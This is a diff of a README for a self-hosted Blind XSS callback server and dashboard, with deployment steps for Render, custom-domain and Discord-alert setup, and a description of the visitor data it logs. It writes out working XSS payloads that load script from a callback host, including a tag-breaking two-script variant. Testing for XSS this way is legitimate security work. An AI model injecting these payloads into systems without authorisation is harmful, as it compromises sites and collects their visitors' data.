@@ -3,243 +3,384 @@
 ![Node.js](https://img.shields.io/badge/Node.js-18%2B-339933?logo=node.js&logoColor=white)
 ![Express](https://img.shields.io/badge/Express-4.x-000000?logo=express&logoColor=white)
 ![Render](https://img.shields.io/badge/Deploy-Render-46E3B7?logo=render&logoColor=000)
+![Discord](https://img.shields.io/badge/Discord-Notifications-5865F2?logo=discord&logoColor=white)
 ![License](https://img.shields.io/github/license/Ranveerrrrr/Blind-XSS-HIT-Dashboard)
 
-A small Blind XSS callback dashboard that serves JavaScript payloads from `/x/<marker>`, logs hits, groups them by page URL, and can notify Discord when a new hit arrives.
+A self-hosted Blind XSS payload server and hit dashboard with unlimited markers, page grouping, filters, import/export, and Discord alerts.
 
-## Features
+## Why This Exists
 
-- Password-protected dashboard at `/dashboard`
-- Payload builder for `/x/<marker>` URLs
-- Hit grouping by page URL/site
-- Filters with suggestions for page URL, IP, and marker
-- Per-page actions: copy URL, cut, paste into another page group, delete
-- Clear all hits
-- Download hit log as `callbacks.jsonl`
-- Import JSON/JSONL hit logs and append them without replacing existing data
-- Optional Discord webhook notifications
-- Optional Render persistent disk support
+Blind XSS testing is painful when your callback tooling does not give you enough control.
 
-## How It Works
+- Burp Collaborator and Interactsh payloads are temporary or tied to a session.
+- Public callback services can expire, rotate, or disappear.
+- Classic XSS Hunter-style setups are useful, but many workflows end up with one generic payload path.
+- When testing many fields, forms, endpoints, and roles, you need to know exactly which payload fired.
 
-Payload URLs use this format:
+This project gives you your own domain and unlimited marker paths:
 
 ```html
-<script src="https://xss.example.com/x/blind-xss"></script>
+<script src="https://xss.yourdomain.com/x/signup-name"></script>
+<script src="https://xss.yourdomain.com/x/admin-note"></script>
+<script src="https://xss.yourdomain.com/x/billing-address"></script>
 ```
 
-Everything after `/x/` becomes the marker. For example:
+Everything after `/x/` is the marker. When it fires, the dashboard shows where it came from, when it triggered, and can send a Discord notification.
+
+## What You Get
+
+- Payload route: `/x/<marker>`
+- Password-protected dashboard: `/dashboard`
+- Unlimited markers, for example `/x/firstname-profile`, `/x/admin-note`, `/x/support-ticket`
+- Hit grouping by page URL/site
+- Filters with suggestions for page URL, IP, and marker
+- 3-dot page actions: copy URL, cut, paste into another page group, delete
+- Full hit download as `callbacks.jsonl`
+- Import old hit logs and append them without replacing current hits
+- Optional Discord webhook notifications for every hit
+- Optional Render persistent disk support so logs survive redeploys
+
+## Recommended Architecture
+
+Use a dedicated subdomain:
 
 ```text
-https://xss.example.com/x/signup-name
+Main website:       https://yourdomain.com
+Blind XSS server:   https://xss.yourdomain.com
+Dashboard:          https://xss.yourdomain.com/dashboard
+Payload base:       https://xss.yourdomain.com/x/<marker>
 ```
 
-logs marker:
+Do not put this behind a static host. It needs a backend because it receives and stores callbacks.
+
+## Step 1: Fork This Repository
+
+1. Open this repository on GitHub.
+2. Click **Fork**.
+3. Choose your GitHub account.
+4. Keep your fork **private** if you do not want your dashboard code/config visible.
+
+Your fork will look like:
 
 ```text
-signup-name
+https://github.com/YOUR_USERNAME/Blind-XSS-HIT-Dashboard
 ```
 
-The app records:
+## Step 2: Clone Your Fork
 
-- marker
-- page URL or referrer
-- IP
-- user agent
-- language
-- viewport
-- source type: `payload-load`, `script`, `image`, or `import`
-- timestamp
+Clone your fork on your machine only so you can change example values and push your own copy.
 
-Random 404 paths do not become hits. Only `/x/<marker>`, `/callback`, and `/i/<marker>.gif` create log entries.
-
-## Local Setup
-
-```powershell
-git clone https://github.com/Ranveerrrrr/Blind-XSS-HIT-Dashboard.git
+```bash
+git clone https://github.com/YOUR_USERNAME/Blind-XSS-HIT-Dashboard.git
 cd Blind-XSS-HIT-Dashboard
-npm install
 ```
 
-Create local environment variables:
+## Step 3: Replace Example Domains
 
-```powershell
-$env:PUBLIC_BASE_URL = "http://localhost:10000"
-$env:DASHBOARD_USERNAME = "admin"
-$env:DASHBOARD_PASSWORD = "change-me"
-$env:SESSION_SECRET = "replace-with-a-long-random-string"
-npm start
-```
-
-Open:
+Search the repo for:
 
 ```text
-http://localhost:10000/dashboard
+xss.example.com
+example.com
 ```
 
-## Required Environment Variables
-
-Set these on your host:
-
-| Variable | Required | Example | Purpose |
-| --- | --- | --- | --- |
-| `PUBLIC_BASE_URL` | Yes | `https://xss.example.com` | Public URL used inside generated payloads |
-| `DASHBOARD_USERNAME` | Yes | `admin` | Dashboard login username |
-| `DASHBOARD_PASSWORD` | Yes | `change-me` | Dashboard login password |
-| `SESSION_SECRET` | Recommended | long random string | Signs dashboard login cookies |
-| `DISCORD_WEBHOOK_URL` | Optional | Discord webhook URL | Sends a notification for each new hit |
-| `DATA_DIR` | Optional | `/var/data` | Directory where `callbacks.jsonl` is stored |
-
-`SESSION_SECRET` falls back to `DASHBOARD_PASSWORD` if not set, but a separate long random value is better.
-
-## Deploy On Render
-
-1. Push this repo to GitHub.
-2. Go to Render and create a new **Web Service**.
-3. Select this repository.
-4. Runtime: **Node**
-5. Build command:
+Replace them in documentation or examples with your real callback subdomain, for example:
 
 ```text
-npm install
+xss.yourdomain.com
 ```
 
-6. Start command:
+The important runtime value is still the Render environment variable:
 
 ```text
-npm start
+PUBLIC_BASE_URL=https://xss.yourdomain.com
 ```
 
-7. Add environment variables:
+## Step 4: Push Your Fork
+
+After your README/example changes:
+
+```bash
+git add .
+git commit -m "Configure dashboard for my domain"
+git push origin main
+```
+
+## Step 5: Create Render Web Service
+
+1. Open [Render](https://render.com/).
+2. Click **New +**.
+3. Choose **Web Service**.
+4. Connect GitHub.
+5. Select your forked repository:
 
 ```text
-PUBLIC_BASE_URL=https://xss.example.com
-DASHBOARD_USERNAME=your-username
-DASHBOARD_PASSWORD=your-password
-SESSION_SECRET=long-random-string
-DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
+YOUR_USERNAME/Blind-XSS-HIT-Dashboard
+```
+
+6. Use these settings:
+
+```text
+Environment: Node
+Build Command: npm install
+Start Command: npm start
+```
+
+7. Create the service.
+
+Render will give you a temporary domain like:
+
+```text
+https://blind-xss-hit-dashboard.onrender.com
+```
+
+Do not use that as your final payload domain if you have your own domain. Use it only until your custom subdomain is connected.
+
+## Step 6: Set Render Environment Variables
+
+In Render:
+
+```text
+Your Web Service -> Environment
+```
+
+Add:
+
+| Key | Example | Required |
+| --- | --- | --- |
+| `PUBLIC_BASE_URL` | `https://xss.yourdomain.com` | Yes |
+| `DASHBOARD_USERNAME` | `bugatsec` | Yes |
+| `DASHBOARD_PASSWORD` | `use-a-strong-password` | Yes |
+| `SESSION_SECRET` | `long-random-string` | Strongly recommended |
+| `DISCORD_WEBHOOK_URL` | `https://discord.com/api/webhooks/...` | Optional |
+| `DATA_DIR` | `/var/data` | Recommended with persistent disk |
+
+Then redeploy the service.
+
+You can check whether dashboard auth is configured:
+
+```text
+https://xss.yourdomain.com/health
+```
+
+Expected:
+
+```json
+{
+  "authConfigured": true
+}
+```
+
+The `/health` endpoint does not reveal your username, password, session secret, or Discord webhook URL.
+
+## Step 7: Add Persistent Storage
+
+If you want hits to stay forever until you delete them, add a persistent disk.
+
+In Render:
+
+1. Open your Web Service.
+2. Go to **Disks**.
+3. Add a disk.
+4. Mount path:
+
+```text
+/var/data
+```
+
+5. Set this environment variable:
+
+```text
 DATA_DIR=/var/data
 ```
 
-8. Deploy the service.
-
-## Connect A Custom Domain
-
-Recommended layout:
+The hit log will be stored at:
 
 ```text
-main website:      https://example.com
-Blind XSS server:  https://xss.example.com
+/var/data/callbacks.jsonl
+```
+
+Without a persistent disk, Render may lose the log on redeploy/restart.
+
+## Step 8: Connect Your Subdomain
+
+Use a subdomain like:
+
+```text
+xss.yourdomain.com
 ```
 
 In Render:
 
 1. Open your Web Service.
 2. Go to **Settings -> Custom Domains**.
-3. Add `xss.example.com`.
-4. Render will show the DNS record you need.
-
-In your DNS provider:
-
-- Add the CNAME or A record Render gives you.
-- Wait for DNS and TLS to become active.
-
-Then set:
+3. Add:
 
 ```text
-PUBLIC_BASE_URL=https://xss.example.com
+xss.yourdomain.com
 ```
 
-Redeploy after changing environment variables.
+4. Render will show a DNS target.
 
-## Persistent Storage
+In your domain/DNS dashboard:
 
-By default, hits are written to:
+1. Create the DNS record Render tells you to create.
+2. Usually this is a CNAME from:
 
 ```text
-callbacks.jsonl
+xss
 ```
 
-On platforms like Render, the filesystem can reset on redeploy unless you use a persistent disk.
-
-For Render:
-
-1. Add a persistent disk to the service.
-2. Mount it at:
+to something like:
 
 ```text
-/var/data
+your-service.onrender.com
 ```
 
-3. Set:
+3. Wait for DNS to propagate.
+4. Wait for Render TLS/HTTPS to become active.
+
+Finally, make sure Render has:
 
 ```text
-DATA_DIR=/var/data
+PUBLIC_BASE_URL=https://xss.yourdomain.com
 ```
 
-The app will store hits at:
+Redeploy after changing it.
 
-```text
-/var/data/callbacks.jsonl
-```
+## Step 9: Add Discord Alerts
 
-## Discord Notifications
+In Discord:
 
-Create a Discord webhook:
-
-1. Open Discord channel settings.
-2. Go to **Integrations -> Webhooks**.
-3. Create webhook.
-4. Copy webhook URL.
-5. Set it as:
+1. Open the channel where you want alerts.
+2. Go to **Edit Channel -> Integrations -> Webhooks**.
+3. Create a webhook.
+4. Copy the webhook URL.
+5. Add it in Render:
 
 ```text
 DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
 ```
 
-Each new hit sends an embed with marker, source, IP, page URL/referrer, and user agent.
+Every new hit sends a Discord embed with:
 
-## Usage
+- marker
+- source type
+- IP
+- page URL/referrer
+- user agent
 
-Open the dashboard:
+## Step 10: Use The Dashboard
+
+Open:
 
 ```text
-https://xss.example.com/dashboard
+https://xss.yourdomain.com/dashboard
 ```
 
-Login with your configured dashboard username/password.
+Login with:
 
-Use a generated payload such as:
+```text
+DASHBOARD_USERNAME
+DASHBOARD_PASSWORD
+```
+
+The dashboard gives you:
+
+- payload builder
+- total hit count
+- unique marker count
+- page URL groups
+- filters for page URL, IP, and marker
+- 3-dot page actions
+- import/export controls
+- clear-all logs
+
+## Payload Usage
+
+Basic marker:
 
 ```html
-<script src="https://xss.example.com/x/blind-xss"></script>
+<script src="https://xss.yourdomain.com/x/blind-xss"></script>
 ```
 
-For different injection points, change the marker:
+Marker per injection point:
 
 ```html
-<script src="https://xss.example.com/x/signup-name"></script>
-<script src="https://xss.example.com/x/admin-note"></script>
-<script src="https://xss.example.com/x/billing-address"></script>
+<script src="https://xss.yourdomain.com/x/signup-name"></script>
+<script src="https://xss.yourdomain.com/x/profile-bio"></script>
+<script src="https://xss.yourdomain.com/x/admin-note"></script>
+<script src="https://xss.yourdomain.com/x/billing-address"></script>
 ```
 
-When the payload is requested or executed, hits appear in the dashboard.
+The dashboard groups hits by page URL and shows the marker so you know exactly which payload fired.
 
-## Dashboard Management
+The payload builder can also produce a two-script variant:
 
-- `Clear all` empties the backend log.
-- `Download hits` downloads the full `callbacks.jsonl`.
-- Selecting an import file previews it locally in your browser.
-- `Add to logs` appends imported hits to the backend log.
-- The 3-dot menu on page groups supports copy, cut, paste, and delete.
+```html
+<script src="https://xss.yourdomain.com/x/blind-xss"></script>"/><script src="https://xss.yourdomain.com/x/blind-xss1"></script>
+```
+
+This can help in some broken HTML contexts where one form of injection closes/escapes differently than another.
+
+## What Gets Logged
+
+The app records:
+
+- marker
+- page URL or referrer
+- IP address
+- user agent
+- browser language
+- viewport
+- source type
+- timestamp
+
+Source types:
+
+| Source | Meaning |
+| --- | --- |
+| `payload-load` | The `/x/<marker>` JavaScript URL was requested |
+| `script` | The JavaScript executed and posted back |
+| `image` | The image fallback fired |
+| `import` | The hit came from an imported log |
+
+## Dashboard Page Actions
+
+Each page group has a 3-dot menu:
+
+- `Copy URL` copies the page URL/group key
+- `Cut` selects all hits in that page group
+- `Paste here` moves cut hits into another page group
+- `Delete` deletes all hits for that page group
+
+## Import And Export
+
+`Download hits` downloads the current backend log:
+
+```text
+callbacks.jsonl
+```
+
+Selecting an import file previews it in the browser. It is not uploaded immediately.
+
+`Add to logs` appends the previewed hits to the backend log. It does not replace existing hits.
+
+Supported import formats:
+
+- JSONL, one hit per line
+- JSON array
+- JSON object with a `callbacks` array
 
 ## Security Notes
 
-- Do not commit real passwords, Discord webhook URLs, or callback logs.
-- Keep `callbacks.jsonl` ignored.
+- Keep your fork private if you do not want others to inspect your setup.
+- Do not commit real dashboard passwords.
+- Do not commit Discord webhook URLs.
+- Do not commit `callbacks.jsonl`.
+- Use HTTPS for your callback domain.
 - Use a strong `SESSION_SECRET`.
-- Use HTTPS for your public payload domain.
-- Rotate credentials if the repository becomes public and you accidentally committed secrets.
+- Rotate credentials if you accidentally expose them.
 
 ## License
 
